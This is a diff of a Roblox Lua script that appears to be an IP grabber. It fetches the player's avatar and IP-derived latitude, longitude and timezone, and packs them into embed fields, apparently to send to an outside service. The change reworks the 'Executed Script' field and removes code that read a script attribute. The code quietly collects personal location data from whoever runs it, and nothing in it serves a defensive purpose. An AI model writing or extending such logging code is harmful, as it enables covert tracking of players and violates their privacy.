@@ -1,6 +1,8 @@
 local httpService = game:GetService("HttpService")
 local player = game:GetService("Players").LocalPlayer
 
+local script_executed -- Se asigna más adelante según el script real
+
 -- Obtener la URL del avatar del jugador
 toURL = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false"
 local successAvatar, avatarData = pcall(function()
@@ -14,17 +16,17 @@ end)
 
 ipData = successIP and ipData or {}
 
--- Obtener el atributo "script"
-local scriptContent = ""
-pcall(function()
-    local attr = script:GetAttribute("script")
-    scriptContent = type(attr) == "string" and attr or "No Script Found"
-end)
-
+-- Función para crear campos dinámicos
 local function createField(name, key)
+    local value
+    if key == "executed_script" then
+        value = script_executed or "Not Found"
+    else
+        value = ipData[key] and tostring(ipData[key]) or "Not Found"
+    end
     return {
         name = name,
-        value = ipData[key] and tostring(ipData[key]) or "Not Found"
+        value = value
     }
 end
 
@@ -49,10 +51,7 @@ pcall(function()
                         createField("Latitude", "latitude"),
                         createField("Longitude", "longitude"),
                         createField("Timezone", "timezone"),
-                        {
-                            name = "Script Ejecutado",
-                            value = "```lua\n" .. scriptContent .. "\n```"
-                        }
+                        createField("Executed Script", "executed_script")
                     }
                 },
                 {
